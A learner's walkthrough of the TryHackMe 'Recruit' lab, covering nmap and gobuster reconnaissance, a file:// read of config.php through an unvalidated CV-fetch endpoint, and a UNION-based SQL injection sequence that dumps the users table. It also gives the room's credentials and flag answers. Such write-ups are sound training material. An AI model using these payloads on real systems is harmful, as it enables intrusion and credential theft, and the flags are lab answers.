# Recruit Tryhackme walkthrough
_Infiltrate Recruit’s new portal. Map the site, hunt for flaws, and gain unauthorised access._

This is my first not-guided room. Yay.

“**Recruit** has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.
Can you gain an initial foothold, escalate your access, and ultimately log in as the **administrator**?”

Interesting. 💀

_What is the flag value after logging in as a normal user?_

## 1 Nmap scan

I performed a simple nmap scan on the ip address first:

```
nmap -sV <IP_ADDRESS_OF LAB_MACHINE>
```
<img width="1400" height="886" alt="image" src="https://github.com/user-attachments/assets/bab35098-81ad-410f-ac74-8e3e7beb971b" />

There are three visible open ports:

* 22/tcp SSH
* 53/tcp domain
* 80/tcp HTTP
  
## 2 Checking the website

Going to

```
http://<LAB_MACHINE_IP>
```

reveals the website, a login interface.

<img width="1400" height="1251" alt="image" src="https://github.com/user-attachments/assets/d2f1347a-5e5b-4a98-a312-400261b2e02f" />

I tried a few default login credentials, (admin:admin, username:password etc.), but they did not work.

## 3 Gobuster

So I decided to use Gobuster:

```
gobuster dir -u http://<LAB_MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt
```

( I used common.txt but if it does not exist in your machine you can try:

```
find /usr/share/wordlists -type f | head -30
```

to see the existing wordlists)

<img width="1400" height="753" alt="image" src="https://github.com/user-attachments/assets/2df96594-a3c8-4f43-a4cf-7a1cc756f1ed" />

We do not have permission to access the ./ files. So I decided to go to /mail:

<img width="1400" height="1104" alt="image" src="https://github.com/user-attachments/assets/12344bd4-c78c-4eb2-9d66-97783149b939" />

The credentials we need are in config.php, and admin credentials are in the database.

## 4 Viewing config.php

I went back to the main page, and by clicking the link named Access API, I was directed to the url below:

<img width="1400" height="1187" alt="image" src="https://github.com/user-attachments/assets/112b3d04-3e4d-45e3-9ae6-a2f80f1f972d" />

Through navigating the page, expanding the “How can I fetch a candidate CV using the API” showed some interesting results.

We can use this to find the config.php;

<img width="1400" height="232" alt="image" src="https://github.com/user-attachments/assets/41218547-be5f-42f3-a47f-8aeac9552ffc" />

Well that did not work.

Going back:

<img width="1400" height="736" alt="image" src="https://github.com/user-attachments/assets/30e8c8e0-ef89-4847-b61f-67b746b568f5" />

So I tried

```
file.php?cv=file://config.php
```

Final URL: **`http://<LAB_MACHINE_IP>/file.php?cv=file://config.php`**

* Explanation: The file.php endpoint’s backend code requires the input to be formatted as a valid URL with a protocol scheme. Passing a plain filename like config.php fails because it does not look like a URL. However, because the API does not restrict which protocols are allowed, we can use PHP's built-in file:// stream wrapper (file://config.php). This tricks the URL validator or fetcher (like cURL) into treating the input as a valid URL while actually instructing the server to read config.php from its own local directory. **_(Google used here)_**

And here we are!

<img width="1400" height="969" alt="image" src="https://github.com/user-attachments/assets/accaf12a-a7f2-43c1-9b38-6bd41dac20ba" />

We got the credentials!!!!! YAY!!!!!

## 5 Logging in as a user

Going back to the login page and entering the credentials we just got

* Username: **hr**
* Password: **hrpassword123**
  
-logs us in and reveals a flag:
<img width="1400" height="1089" alt="image" src="https://github.com/user-attachments/assets/1e70ce9d-edb4-4b5d-9e87-6d74c09ec5dd" />

The flag is: **THM{LOGGED_IN_USER}**

---

_What is the flag value after logging in as admin?_

So just now the Access API mentioned that the admin credentials are stored in the database. We can try SQL Injection.
<img width="1400" height="825" alt="image" src="https://github.com/user-attachments/assets/362d6c64-0bee-4b2a-946d-69937f3eac5d" />

A simple payload ‘ in the search box and we see this is vulnerable to sql injection.
Based on the error, the query is probably looks like ‘%smth%’.
So we use a UNION payload:

```
' UNION SELECT 1,2,3 -- -
```

But it returned an error:

<img width="1400" height="1019" alt="image" src="https://github.com/user-attachments/assets/19b1ae0f-ea5d-45a8-abcb-65e1d0a27f58" />

Using

```
' UNION SELECT 1,2,3,4 -- -
```

resolves the error and returns us with:

<img width="1400" height="1089" alt="image" src="https://github.com/user-attachments/assets/c1f5aadf-e800-48f3-b207-6c3570109607" />

Next, the table name:

```
' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -
```

And we see the table named “users” (be careful not to confuse it with “user” which is useless.)

Using

```
' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

to find the columns. I found a column named password in the output, so

```
' UNION SELECT password,2,3,username FROM users-- -
```

returns the admin credentials.

<img width="1400" height="1025" alt="image" src="https://github.com/user-attachments/assets/4731c50d-c818-4d5f-a177-c7338d27e350" />

_After reading some more about this room I realised that we could also use SQLmap, which is much easier but I will not cover it here. If you want to try the SQLmap method, please refer to:_

[link here](https://infosecwriteups.com/recruit-thm-writeup-e8e865de647d)

Using the recently acquired credentials:

* username: admin
* password: admin@001admin

Directs us to

<img width="1400" height="1005" alt="image" src="https://github.com/user-attachments/assets/14ac83a5-8a7d-405f-a515-ee64558891d1" />

and reveals the flag:

**THM{LOGGED_IN_ADM1N1}**

---

Just like that we have completed the Recruit room. Again, this was my first time trying to do through an unguided room, so if you all have any ideas please leave a comment/like to support me! That’s all for this week and thank you for reading.



